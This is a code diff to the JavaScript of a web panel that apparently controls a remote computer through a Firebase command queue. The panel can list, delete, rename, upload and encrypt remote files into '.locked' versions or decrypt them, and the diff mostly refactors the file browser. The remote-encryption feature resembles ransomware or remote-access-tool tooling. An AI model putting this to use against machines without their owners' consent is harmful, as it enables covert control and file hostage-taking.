@@ -294,6 +294,8 @@ function switchTab(el,name){
  if(name==='processes')loadProcesses();
 }
 
+let g_fileEntries=null;
+function escAttr(t){return t.replace(/&/g,'&amp;').replace(/'/g,'\\&apos;').replace(/"/g,'&quot;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}
 async function sendAndWait(type,payload,el,errId){
  const errEl=document.getElementById(errId);
  if(errEl)errEl.style.display='none';
@@ -306,7 +308,7 @@ async function sendAndWait(type,payload,el,errId){
   if(!cmdId){el.innerHTML='<div class="loading">Failed to send</div>';if(errEl){errEl.textContent='No command ID returned';errEl.style.display='block';}return null;}
   el.innerHTML='<div class="loading"><span class="spinner"></span>Waiting for response...</div>';
   for(let i=0;i<30;i++){
-   await new Promise(r=>setTimeout(r,200));
+   await new Promise(r=>setTimeout(r,100));
    try{
     const r=await fetch(FB+'/commands/'+encodeURIComponent(computer)+'/'+cmdId+'.json');
     if(!r.ok)continue;
@@ -317,7 +319,7 @@ async function sendAndWait(type,payload,el,errId){
     }
    }catch{}
   }
-  el.innerHTML='<div class="loading">Timeout — no response within 6s</div>';
+  el.innerHTML='<div class="loading">Timeout — no response within 3s</div>';
   if(errEl){errEl.textContent='Client did not respond';errEl.style.display='block';}
   return null;
  }catch(e){el.innerHTML='<div class="loading">Error</div>';if(errEl){errEl.textContent=e.message||'unknown';errEl.style.display='block';}return null;}
@@ -422,12 +424,13 @@ function renderFiles(json){
  const el=document.getElementById('filesBrowser');
  let entries;try{entries=JSON.parse(json)}catch{el.innerHTML='<div class="loading">Parse error</div>';return}
  if(!Array.isArray(entries)){el.innerHTML='<div class="loading">Bad response</div>';return}
+ g_fileEntries=entries;
  let html='<div class="path"><span>'+esc(filePath||'This PC')+'</span>';
  if(filePath)html+='<button class="btn btn-ghost btn-sm" onclick="browseDir(\'\')">Root</button>';
  if(filePath){const p=filePath.replace(/\\+$/,'');const idx=p.lastIndexOf('\\');if(idx>0)html+='<button class="btn btn-ghost btn-sm" onclick="browseDir(\''+uenc(p.substr(0,idx+1))+'\')">Up</button>';}
  html+='</div>';
- entries.forEach(e=>{
-  const nm=e.n||'?';const isDir=e.d===true||e.d==='true';const sz=e.s||0;const dt=e.m||'';
+ for(let i=0;i<entries.length;i++){
+  const e=entries[i];const nm=e.n||'?';const isDir=e.d===true||e.d==='true';const sz=e.s||0;const dt=e.m||'';
   const szStr=sz<1024?sz+' B':sz<1048576?(sz/1024).toFixed(1)+' KB':(sz/1048576).toFixed(1)+' MB';
   const fp=filePath+nm;
   html+='<div class="entry'+(isDir?' dir':'')+'">';
@@ -437,50 +440,68 @@ function renderFiles(json){
   html+='<div class="dt">'+esc(dt)+'</div>';
   if(!isDir){
    html+='<div class="acts">';
-   html+='<button class="btn btn-ghost btn-xs" onclick="fileRename(\''+escAttr(nm)+'\')" title="Rename">✏️</button>';
-   html+='<button class="btn btn-ghost btn-xs" onclick="fileDeleteOp(\''+escAttr(fp)+'\')" title="Delete">🗑️</button>';
-   html+='<button class="btn btn-ghost btn-xs" onclick="fileEncryptOp(\''+escAttr(fp)+'\')" title="Encrypt">🔒</button>';
-   if(nm.endsWith('.locked'))html+='<button class="btn btn-ghost btn-xs" onclick="fileDecryptOp(\''+escAttr(fp)+'\')" title="Decrypt">🔓</button>';
+   html+='<button class="btn btn-ghost btn-xs" onclick="fileRename('+i+')" title="Rename">✏️</button>';
+   html+='<button class="btn btn-ghost btn-xs" onclick="fileDeleteOp('+i+')" title="Delete">🗑️</button>';
+   html+='<button class="btn btn-ghost btn-xs" onclick="fileEncryptOp('+i+')" title="Encrypt">🔒</button>';
+   if(nm.endsWith('.locked'))html+='<button class="btn btn-ghost btn-xs" onclick="fileDecryptOp('+i+')" title="Decrypt">🔓</button>';
    html+='</div>';
   }else{
-   html+='<div class="acts"><button class="btn btn-ghost btn-xs" onclick="fileRename(\''+escAttr(nm)+'\')" title="Rename">✏️</button>';
-   html+='<button class="btn btn-ghost btn-xs" onclick="fileDeleteOp(\''+escAttr(fp)+'\')" title="Delete">🗑️</button></div>';
+   html+='<div class="acts"><button class="btn btn-ghost btn-xs" onclick="fileRename('+i+')" title="Rename">✏️</button>';
+   html+='<button class="btn btn-ghost btn-xs" onclick="fileDeleteOp('+i+')" title="Delete">🗑️</button></div>';
   }
   html+='</div>';
- });
+ }
  el.innerHTML=html;
 }
 
-async function fileDeleteOp(path){
- if(!confirm('Delete "'+path.split('\\').pop()+'"?'))return;
+function refreshLocalFiles(){
+ if(!g_fileEntries||!Array.isArray(g_fileEntries))return;
+ renderFiles(JSON.stringify(g_fileEntries));
+}
+async function fileDeleteOp(i){
+ if(!g_fileEntries||!g_fileEntries[i])return;
+ const nm=g_fileEntries[i].n||'';
+ if(!confirm('Delete "'+nm+'"?'))return;
+ const path=filePath+nm;
  const el=document.getElementById('filesBrowser');const errEl=document.getElementById('filesErr');
  errEl.style.display='none';el.innerHTML='<div class="loading">Deleting...</div>';
  const res=await sendAndWait('file_delete',path,el,'filesErr');
- if(res)refreshFiles();
+ if(res){g_fileEntries.splice(i,1);refreshLocalFiles();}
 }
-async function fileRename(name){
- const newName=prompt('New name:',name);if(!newName||newName===name)return;
- const path=filePath+name;
+async function fileRename(i){
+ if(!g_fileEntries||!g_fileEntries[i])return;
+ const oldNm=g_fileEntries[i].n||'';
+ const newName=prompt('New name:',oldNm);if(!newName||newName===oldNm)return;
+ const path=filePath+oldNm;
  const el=document.getElementById('filesBrowser');const errEl=document.getElementById('filesErr');
  errEl.style.display='none';el.innerHTML='<div class="loading">Renaming...</div>';
  const res=await sendAndWait('file_rename',JSON.stringify({path,name:newName}),el,'filesErr');
- if(res)refreshFiles();
+ if(res){g_fileEntries[i].n=newName;refreshLocalFiles();}
 }
-async function fileEncryptOp(path){
- if(!confirm('Encrypt "'+path.split('\\').pop()+'"? This will replace the file with a .locked version.'))return;
+async function fileEncryptOp(i){
+ if(!g_fileEntries||!g_fileEntries[i])return;
+ const nm=g_fileEntries[i].n||'';
+ if(!confirm('Encrypt "'+nm+'"?'))return;
+ const path=filePath+nm;
  const el=document.getElementById('filesBrowser');const errEl=document.getElementById('filesErr');
  errEl.style.display='none';el.innerHTML='<div class="loading">Encrypting...</div>';
  const res=await sendAndWait('file_encrypt',path,el,'filesErr');
- if(res)refreshFiles();
+ if(res){g_fileEntries[i].n=nm+'.locked';refreshLocalFiles();}
 }
-async function fileDecryptOp(path){
- if(!confirm('Decrypt "'+path.split('\\').pop()+'"? This will restore the original file.'))return;
+async function fileDecryptOp(i){
+ if(!g_fileEntries||!g_fileEntries[i])return;
+ const nm=g_fileEntries[i].n||'';
+ if(!confirm('Decrypt "'+nm+'"?'))return;
+ const path=filePath+nm;
  const el=document.getElementById('filesBrowser');const errEl=document.getElementById('filesErr');
  errEl.style.display='none';el.innerHTML='<div class="loading">Decrypting...</div>';
  const res=await sendAndWait('file_decrypt',path,el,'filesErr');
- if(res)refreshFiles();
+ if(res){
+  if(nm.endsWith('.locked'))g_fileEntries[i].n=nm.slice(0,-7);
+  else g_fileEntries[i].n+='.unlocked';
+  refreshLocalFiles();
+ }
 }
-function refreshFiles(){if(filePath)browseDir(filePath);else browseDir('');}
 async function uploadFile(file){
  const path=filePath+file.name;
  const reader=new FileReader();
@@ -489,7 +510,12 @@ async function uploadFile(file){
   const el=document.getElementById('filesBrowser');const errEl=document.getElementById('filesErr');
   errEl.style.display='none';el.innerHTML='<div class="loading">Uploading '+esc(file.name)+'...</div>';
   const res=await sendAndWait('file_upload',JSON.stringify({path,data:base64}),el,'filesErr');
-  if(res)refreshFiles();
+  if(res){
+   if(g_fileEntries&&Array.isArray(g_fileEntries)){
+    g_fileEntries.push({n:file.name,s:Math.round(base64.length*0.75),m:new Date().toISOString().slice(0,10),d:false});
+    refreshLocalFiles();
+   }else browseDir(filePath);
+  }
  };
  reader.readAsDataURL(file);
 }
